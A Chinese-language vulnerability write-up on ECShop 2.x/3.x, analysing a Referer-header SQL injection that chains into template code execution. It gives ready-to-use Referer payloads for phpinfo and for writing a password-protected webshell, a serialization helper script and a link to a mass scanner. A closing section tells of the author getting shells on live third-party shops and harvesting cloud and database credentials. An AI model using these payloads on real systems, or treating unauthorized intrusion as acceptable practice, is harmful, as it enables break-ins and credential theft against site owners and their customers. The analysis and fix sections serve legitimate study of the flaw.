## 漏洞概述

ECShop的user.php文件中的display函数的模版变量可控，导致注入，配合注入可达到远程代码执行。攻击者无需登录站点等操作，可以直接远程写入webshell，危害严重。

## 漏洞评级

严重

## 影响范围

ECShop全系列版本，包括2.x,3.0.x,3.6.x等。

## 漏洞分析

### 0x01. SQL注入

先看 `ecshop/user.php:302`

  
![image.png](https://image.3001.net/images/20180920/1537426195_5ba343134992a.png!small)  

`$back_act` 变量来源于 `HTTP_REFERER` ，可控。

Ecshop 使用了 php 模版引擎 smarty
，该引擎有两个基本的函数assign()、display()。assign()函数用于在模版执行时为模版变量赋值，display()函数用于显示模版。smarty运行时，会读取模版文件，将模版文件中的占位符替换成assign()函数传递过来的参数值，并输出一个编译处理后的php文件，交由服务器运行。

在：`ecshop/includes/init.php:169`文件中创建了Smarty对象`cls_template`来处理模版文件，对应的文件是`includes/cla_template.php`，如下图：

  
![image.png](https://image.3001.net/images/20180920/1537426206_5ba3431e415fd.png!small)  

我们再看 `assign`函数：`ecshop/includes/cls_template.php：70`

  
![image.png](https://image.3001.net/images/20180920/1537426211_5ba34323172ae.png!small)  

`assign`函数用于在模版变量里赋值。

`display` 函数：`ecshop/includes/cls_template.php：100`

  
![image.png](https://image.3001.net/images/20180920/1537426217_5ba3432946e2b.png!small)  

从函数来看，首先会调用 `$this->fetch` 来处理`user_passport.dwt` 模板文件，`fetch()` 函数中会调用
`$this->make_compiled` 来编译模板。 `make_compiled` 会将模板中的变量解析，也就是在这个时候将上面 `assign`
中注册到的变量 `$back_act` 传递进去了，解析完变量之后返回到 `display` 函数中。此时 `$out` 是解析变量后的html内容，判断
`$this->_echash` 是否在 `$out` 中，若在，使用 `$this->_echash` 来分割内容，得到 `$k` 然后交给
`insert_mod` 处理。

`user_passport.dwt` 模版文件内容：

  
![image.png](https://image.3001.net/images/20180920/1537426223_5ba3432f6ce44.png!small)  

来看看 `_echash` 是啥，此文件28行：

  
![image.png](https://image.3001.net/images/20180920/1537426229_5ba343357fcf2.png!small)  

由于 `_echash` 是固定的，不是随机生成的。（2.7版本的 `_echash` 值为
`554fcae493e564ee0dc75bdf2ebf94ca`而3.x版本的 `_echash` 值为
`45ea207d7a2b68c49582d2d22adf953` ）所以 `$val` 内容可控！

跟进 `insert_mod()`函数，此文件1150行：

  
![image.png](https://image.3001.net/images/20180920/1537426234_5ba3433ab116c.png!small)  

`$val` 传递进来，先用 `|` 分割，得到 `$para` 和 `$fun` ，`$para` 进行反序列操作，`insert_` 和 `$fun`
拼接，最后动态调用 `$fun($para)` 。函数名部分可控，参数完全可控。接下来就是寻找以 `insert_` 开头的可利用的函数了，在
`ecshop/includes/lib_insert.php` 有一个 `insert_ads` 函数，正好满足要求。

最后来看动态内容函数库中的 `insert_ads()` 函数：`ecshop/includes/lib_insert.php：136`

  
![image.png](https://image.3001.net/images/20180920/1537426241_5ba34341bc56f.png!small)  

可以看到这里执行了SQL语句，而 `$arr['id']` 和 `$arr['num']`
这两个参数正是我们传进来的数组中的内容，参数可控，而且没有作任何过滤，就造成了SQL注入漏洞。

payload：  
`Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:”num”;s:72:”0,1
procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)–
-“;s:2:”id”;i:1;}`

  
![image.png](https://image.3001.net/images/20180920/1537426248_5ba3434890be7.png!small)  

其数据库查询语句为：

    
    
    SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecsshop2`.`ecs_ad` AS a LEFT JOIN `ecsshop2`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1537322291' AND end_time >= '1537322291' AND a.position_id = '1' ORDER BY rnd LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -
### 0x02. 远程代码执行

接着，程序会调用模板类的 `fetch()` 函数：`ecshop/includes/lib_insert.php：215`

  
![image.png](https://image.3001.net/images/20180920/1537426254_5ba3434ee71e9.png!small)  

在 `user.php` 中调用 `display` ，然后调用 `fetch` 的时候传入的参数是 `user_passport.dwt`
，而在此处传入的参数是 `$position_style` 。向上溯源，发现是 `$row['position_style']`
赋值而来：`ecshop/includes/lib_insert.php：176`

  
![image.png](https://image.3001.net/images/20180920/1537426273_5ba343612f003.png!small)  

而 `position_style` 是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是 `$position_style`
可控。要到 `$position_style = $row['position_style'];` 还有一个条件，就是
`$row['position_id']` 要等于 `$arr['id']` 。

并且构造SQL注入时，这段SQL操作 `ORDER BY rnd LIMIT 1`
部分换行了截断不了,所以需要在id处构造注释来配合num进行union查询。

  
![image.png](https://image.3001.net/images/20180920/1537426279_5ba343671fc71.png!small)  

那么`id`传入 `'/*`， `num` 传入 `*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -`
即可绕过这两个问题。

数据库查询语句为：`SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code,
a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd
FROM`ecsshop`.`ecs_ad`AS a LEFT JOIN`ecsshop`.`ecs_ad_position`AS p ON
a.position_id = p.position_id WHERE enabled = 1 AND start_time <= '1535678679'
AND end_time >= '1535678679' AND a.position_id = ''/*' ORDER BY rnd LIMIT */
union select 1,0x272f2a,3,4,5,6,7,8,9,10-- -;`

  
![image.png](https://image.3001.net/images/20180920/1537426284_5ba3436ce2d85.png!small)  

之后 `$position_style` 会拼接 `'str:'` 传入 `fetch` 函数。

追踪 `fetch()` 函数：`ecshop/includes/cls_template.php：135`

  
![image.png](https://image.3001.net/images/20180920/1537426289_5ba34371aa7ba.png!small)  

因为之前拼接 `'str:'` 了，所以 `strncmp($filename,'str:', 4) == 0` 为真，然后会调用危险函数
`$this->_eval` ，这也就是最终触发漏洞的点。但是参数在传递之前经过了 `fetch_str` 方法的处理，跟进：
`ecshop/includes/cls_template.php:281`

  
![image.png](https://image.3001.net/images/20180920/1537426298_5ba3437a2d97b.png!small)  

第一个正则会匹配一些关键字后置空，主要看最后的返回正则：  
`return preg_replace("/{([^\}\{\n]*)}/e", "\$this->select('\\1');", $source);`

这个正则是将 `$source` 的值交于 `$this->select()` 函数处理。例如， `$source` 的值是 `xxx{$abc}xxx`
，正则捕获到的 `group 1` 就是 `$abc` ，然后就会调用 `$this->select("$abc")` 。

  
![image.png](https://image.3001.net/images/20180920/1537426305_5ba343812572e.png!small)  

跟进 `select()` 函数： `本文件368行`

  
![image.png](https://image.3001.net/images/20180920/1537426310_5ba3438679969.png!small)  

当传入的变量的第一个字符是 `$` 时，会返回由 php 标签包含变量的字符串，最终返回到 `_eval()` 危险函数内执行。在返回之前，还调用了
`$this->get_var` 处理，跟进 `get_var`： `本文件548行`

  
![image.png](https://image.3001.net/images/20180920/1537426316_5ba3438ce7ac0.png!small)  

当传入的变量没有 `.$` 时，调用 `$this->make_var` ，跟进`make_var()` ： `本文件671行`

  
![image.png](https://image.3001.net/images/20180920/1537426322_5ba3439237713.png!small)  

在这里结合 `select` 函数里面的语句来看， `<?php echo $this->_var[' $val '];?>` ，要成功执行代码的话，
`$val` 必须要把 `['` 闭合，所以payload构造，从下往上构造。 `$val` 为 `abc'];echo phpinfo();//；` 从
`select` 函数进入 `get_var` 的条件是第一个字符是 `$` ，所以payload变成了 `$abc'];echo
phpinfo();//；` 而要进入到 `select` ，需要被捕获，payload变成了 `{$abc'];echo phpinfo();//}`
，这里因为payload的是 `phpinfo()` ，这里会被 `fetch_str` 函数的第一个正则匹配到，需要变换一下，所以payload变为
`{$abc'];echo phpinfo/**/();//}` 。到这里为止，php
[恶意代码](http://bbs.ichunqiu.com/portal.php)就构造完成了。

结合之前的SQL注入漏洞，最终执行恶意代码的payload为：

    
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca

### 0x03. ECShop3.x

简单讲一下3.x版本吧。

在ECShop3.x版本中，添加了一个 `includes/safety.php` 文件，专门用于消除有害数据，它的正则会匹配到 `set`、
`concat` 、`information_schema`、 `select from`
等语句。暂时没有找到可绕过的SQL语句，但是命令执行还是可以绕过的。因为我们之前的payload经过编码，这样就绕过了正则匹配。现在唯一能匹配到的就是
`union select` 语句，我们可以同时利用 `$arr['id']` 和 `$arr['num']` 两个参数，将 `union` 和
`select` 分开传递即可绕过正则检测。

## 漏洞复现

本次复现的是ECShop_V2.7.3，打包源码[ECShop_V2.7.3_UTF8_release1106.rar](https://pan.baidu.com/s/1rz1NzQej3M-rMT59Y62NHw)（提取码：`2yk1`）。ecshop2.7.3是在php5.2环境下开发的老网店系统了，现在很多服务器环境已经升级为PHP5.3或php5.4甚至更好的了，那么在php5.3以上版本的服务器环境中运行出现必然出现很多兼容问题，推荐2篇解决文章：[1](https://www.wanweiwang.cn/FAQ/view/678.html)、[2](https://yunzhuji.shop/article/87.html)。

phpinfo()：

  
![image.png](https://image.3001.net/images/20180920/1537426337_5ba343a1df468.png!small)  

webshell：

  
![image.png](https://image.3001.net/images/20180920/1537426342_5ba343a6b16bf.png!small)  

不想本地搭建环境的朋友，推荐两个在线漏洞环境，但是为了更深刻的了解其原理与学习，建议本地搭建调试分析。

[在线环境vulnspy](https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&autogo=1)

[在线环境vulhub](https://vulhub.org/#/environments/ecshop/xianzhi-2017-02-82239600/)

## EXP与一个小脚本

### 2.x

phpinfo():

    
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca

webshell:

    
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}

会在网站根目录生成`1.php`，密码：`1337`

### 3.x

phpinfo():

    
    
    Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a

webshell:

    
    
    Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:289:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953a

会在网站根目录生成`1.php`，密码：`1337`

### 小脚本

下面给出一个序列化的php脚本（第9个位置就是你想要的）：

    
    
    <?php
    $arr=array('num'=>'*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79776E50443977614841675A585A686243676B58314250553152624F546C644B543867506963702729293B2F2F7D787878,10-- -','id'=>'\'/*');
    echo serialize($arr);
    ?>

### 批量扫描检测工具

一款采用C#开发的扫描工具，专门扫描EcShop < 4.0 远程代码执行漏洞，1万个网站只需要30秒左右就能完成了。

[EcShop_RCE_Scanner](https://github.com/Hzllaga/EcShop_RCE_Scanner)

  
![image.png](https://image.3001.net/images/20180920/1537426352_5ba343b018c39.png!small)  

## 漏洞修复

目前我们分析下载最新版的ECShop 4.0里对这个漏洞进行修复：

看到 `ecshop4/ecshop/includes/lib_insert.php`

  
![image.png](https://image.3001.net/images/20180920/1537426357_5ba343b5779ea.png!small)  

可以看到，将传递进来的 `$arr[id]` 和`$arr[num]` 强制转换成整型，这样就没法利用这个漏洞了。

另外我们注意到官方并没有发布针对老版本的(2.x和3.x)的独立修复补丁，相关老版本的用户可参考ECShop 4.0代码来修复或者直接升级到ECShop
4.0。

## 实战与提权

随便找了个2.7.3和3.0.0的站。直接用exp就能getshell，像本地搭建的一样。

最近听老师说搞安全的最高境界其实是[社会工程学](http://www.ichunqiu.com/#profession)。我在进数据库看到加密后的密码，知道加密方式后，搞了很久还是解不出来后台密码，室友在旁边花了几分钟当场把密码猜出来。所以说，最牛逼的是一口能猜出密码，哪还要搞那么多花里胡哨的东西哦~

  
![image.png](https://image.3001.net/images/20180920/1537426370_5ba343c2e1ab1.png!small)  

有新站：

  
![image.png](https://image.3001.net/images/20180920/1537426375_5ba343c78e8d9.png!small)  

有老站:

  
![image.png](https://image.3001.net/images/20180920/1537426380_5ba343cc9a3f0.png!small)  

新站刚建就爆漏洞，老站还在更新内容，有点意思。

直接把很重要的东西写在一个稍微隐蔽点的地方，还是被我翻到了，比如阿里云账号密码，数据库账号密码。

  
![image.png](https://image.3001.net/images/20180920/1537426386_5ba343d2ae747.png!small)  

而且他的密码还都几乎都是是弱口令，真是让人深思。

### 关于提权

哈哈，暂时没找到方法。小白也才开始学提权，说出来其实是想有大佬能指点一二，等提权了再更新这一部分吧。

不能执行命令，有读写权限。

  
![image.png](https://image.3001.net/images/20180920/1537426394_5ba343da4bf27.png!small)  

  
![image.png](https://image.3001.net/images/20180920/1537426402_5ba343e2776d6.png!small)  

## 参考资料

[http://ringk3y.com/2018/08/31/ecshop2-x代码执行](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C)

[ECShop 0day
的堕落之路](https://www.wtfsec.org/3862/ecshop-0day-%E7%9A%84%E5%A0%95%E8%90%BD%E4%B9%8B%E8%B7%AF/)

[关于ECShop前台注入和getshell漏洞的一些思考](https://xz.aliyun.com/t/2725)

# 大家有任何问题可以提问，更多文章可到[i春秋论坛](https://bbs.ichunqiu.com/portal.php?from=beef)阅读哟~

